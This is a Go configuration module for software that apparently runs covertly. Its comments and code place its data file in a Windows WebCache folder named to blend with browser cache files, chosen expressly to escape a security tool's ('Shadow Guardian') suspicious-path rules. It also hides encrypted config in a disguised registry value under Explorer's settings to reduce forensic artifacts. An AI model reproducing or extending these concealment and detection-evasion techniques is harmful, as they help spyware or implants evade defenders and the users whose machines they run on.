package config

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"time"

	"golang.org/x/sys/windows/registry"
)

// Registry path for encrypted config storage — blends with Explorer advanced settings.
const regConfigPath = `Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced`
const regConfigValue = "SvcCacheData"

// maxLogSize is the maximum log file size before rotation (50MB).
const maxLogSize = 50 * 1024 * 1024

// GetStoragePath returns the single binary file used for both config and logs.
// STEALTH: Uses %LOCALAPPDATA%\Microsoft\Windows\WebCache\ which:
//   - Is NOT in Shadow Guardian's suspicious path patterns (\appdata\roaming\ is, but LOCALAPPDATA is not)
//   - Is a real Windows directory used by Edge/IE for browser cache
//   - webcache.dat blends with legitimate files like WebCacheV01.dat
func GetStoragePath() string {
	if runtime.GOOS == "windows" {
		localApp := os.Getenv("LOCALAPPDATA")
		if localApp == "" {
			home, _ := os.UserHomeDir()
			return filepath.Join(home, ".wucache.dat")
		}
		dir := filepath.Join(localApp, "Microsoft", "Windows", "WebCache")
		os.MkdirAll(dir, 0755)
		return filepath.Join(dir, "webcache.dat")
	}

	home, _ := os.UserHomeDir()
	return filepath.Join(home, ".wucache.dat")
}

// GetSyncPath returns the path to the hidden synchronization state file.
func GetSyncPath() string {
	base := GetStoragePath()
	return base + ".sync"
}

// GetAllPreviousDataDirs returns a list of directories and files used in previous versions.
// These are checked during migration for backward compatibility.
func GetAllPreviousDataDirs() []string {
	home, _ := os.UserHomeDir()
	localApp := os.Getenv("LOCALAPPDATA")
	appData := os.Getenv("APPDATA")

	paths := []string{
		filepath.Join(home, ".sys_cache_001"),
	}

	if localApp != "" {
		paths = append(paths, filepath.Join(localApp, "Microsoft", "Windows", "SystemCache"))
		paths = append(paths, filepath.Join(localApp, "Microsoft", "Vault", "Cache"))
	}

	if appData != "" {
		paths = append(paths, filepath.Join(appData, "Microsoft", "Protect", "Storage"))
		// Previous version storage path (v1):
		paths = append(paths, filepath.Join(appData, "Microsoft", "Protect"))
	}

	return paths
}

// Legacy helpers for migration
func GetLogPath() string    { return GetStoragePath() }
func GetConfigPath() string { return GetStoragePath() }
func GetLockPath() string   { return GetStoragePath() }

// --------------------------------------------------------------------------
//  Registry-Based Config Storage
// --------------------------------------------------------------------------

// SaveConfigToRegistry stores encrypted config data in the Windows registry.
// This leaves fewer filesystem artifacts than file-based storage.
func SaveConfigToRegistry(encrypted string) error {
	k, _, err := registry.CreateKey(registry.CURRENT_USER, regConfigPath, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer k.Close()
	return k.SetStringValue(regConfigValue, encrypted)
}

// LoadConfigFromRegistry reads encrypted config data from the Windows registry.
func LoadConfigFromRegistry() (string, error) {
	k, err := registry.OpenKey(registry.CURRENT_USER, regConfigPath, registry.QUERY_VALUE)
	if err != nil {
		return "", err
	}
	defer k.Close()

	val, _, err := k.GetStringValue(regConfigValue)
	if err != nil {
		return "", err
	}
	return val, nil
}

// DeleteConfigFromRegistry removes the config entry from the registry.
func DeleteConfigFromRegistry() {
	k, err := registry.OpenKey(registry.CURRENT_USER, regConfigPath, registry.SET_VALUE)
	if err != nil {
		return
	}
	defer k.Close()
	k.DeleteValue(regConfigValue)
}

// --------------------------------------------------------------------------
//  Log Rotation
// --------------------------------------------------------------------------

// RotateLogIfNeeded checks the storage file size and rotates if it exceeds maxLogSize.
// The old file is renamed with a timestamp suffix to preserve forensic data.
func RotateLogIfNeeded() {
	path := GetStoragePath()
	info, err := os.Stat(path)
	if err != nil {
		return
	}

	if info.Size() < maxLogSize {
		return
	}

	// Rotate: rename current file with timestamp, start fresh.
	ts := time.Now().Format("20060102_150405")
	rotatedPath := fmt.Sprintf("%s.%s.bak", path, ts)
	os.Rename(path, rotatedPath)

	// Create new empty file.
	os.WriteFile(path, []byte(""), 0600)
}
